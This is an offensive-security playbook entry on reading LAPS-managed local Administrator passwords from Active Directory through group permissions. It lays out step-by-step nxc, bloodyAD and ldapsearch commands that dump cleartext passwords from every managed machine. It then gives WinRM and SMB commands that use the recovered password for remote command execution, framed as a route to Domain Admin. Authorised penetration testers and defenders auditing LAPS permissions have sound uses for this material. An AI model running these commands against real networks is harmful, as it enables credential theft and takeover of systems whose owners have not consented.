# LAPS Local-Admin Password Read via Group Membership

## When this applies

- AD environment with LAPS deployed (legacy `ms-Mcs-AdmPwd` or modern Windows LAPS `msLAPS-Password`).
- Your principal is in a group with `ReadProperty` on the LAPS attribute (often named `LAPS_Readers`, `LAPS_Admins`, `IT-LAPS`, etc.).
- Goal: read every LAPS-managed machine's local Administrator password as cleartext over LDAP.

## Technique

LAPS stores managed local Administrator passwords as cleartext (legacy) or DPAPI-NG-encrypted (Windows LAPS) on the computer object. Any user with `ReadProperty` on the attribute can dump them. On a single-DC environment this is Domain Admin in one query.

## Steps

```bash
# Any user with ReadProperty on the ms-Mcs-AdmPwd attribute can read every LAPS-managed
# machine's local Administrator password as cleartext over LDAP. The permission is
# usually granted via a group named LAPS_Readers / LAPS_Admins / IT-LAPS / similar.
# On a single-DC environment this is Domain Admin in one query.

# Step 1 — after foothold, check the user's group memberships:
nxc ldap DC_IP -u user -p pass --groups-membership user
# Or: bloodyAD -d dom -u user -p pass --host DC_IP get user user
# Look for *LAPS*, *Readers*, IT-* groups whose name suggests LAPS access.

# Step 2 — read LAPS passwords. nxc has a built-in module:
nxc ldap DC_IP -u user -p pass -M laps
# Module output: ComputerName | ms-Mcs-AdmPwd (cleartext) | ms-Mcs-AdmPwdExpirationTime

# Or raw LDAP (works even when the nxc module is unavailable):
ldapsearch -H ldap://DC_IP -x -D 'user@dom.tld' -w 'pass' \
  -b 'DC=dom,DC=tld' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd dNSHostName
# If the bind returns NO rows, you don't have ReadProperty on the attribute.
# If the bind returns rows but ms-Mcs-AdmPwd is empty, LAPS is configured but you
# lack permission — re-check group membership.

# Step 3 — PtH/PtP the recovered local Admin password into SMB or WinRM:
nxc winrm DC_IP -u Administrator -p '<LAPS_password>' -X 'whoami /all'
nxc smb   DC_IP -u Administrator -p '<LAPS_password>' --shares
# Watch for special characters — quote the password, or pass via env var.

# Newer Windows LAPS (post-2023) uses a different attribute schema — try the
# 'msLAPS-Password' / 'msLAPS-EncryptedPassword' attributes if 'ms-Mcs-AdmPwd' is
# empty on a recent build:
ldapsearch ... '(msLAPS-Password=*)' msLAPS-Password
# Encrypted variant requires DPAPI-NG decryption — see Microsoft's "Windows LAPS"
# docs and the `pylaps` / `LAPSv2.0` tools.
```

## Verifying success

- `nxc ldap DC -u user -p pass -M laps` enumerates ComputerName + cleartext password rows.
- `nxc winrm <COMPUTER> -u Administrator -p <password>` lands a shell.

## Common pitfalls

- `ms-Mcs-AdmPwd` is empty when LAPS is deployed but you lack `ReadProperty` — verify group membership first.
- Modern Windows LAPS uses `msLAPS-Password` (often DPAPI-NG-encrypted) — needs `pylaps`/`LAPSv2.0` for decryption.
- Special characters in passwords break shell unquoted args — pass via environment variable or hex-encode.

## Tools

- nxc (`-M laps`)
- ldapsearch
- bloodyAD
- pylaps / LAPSv2.0 (for encrypted Windows LAPS variants)
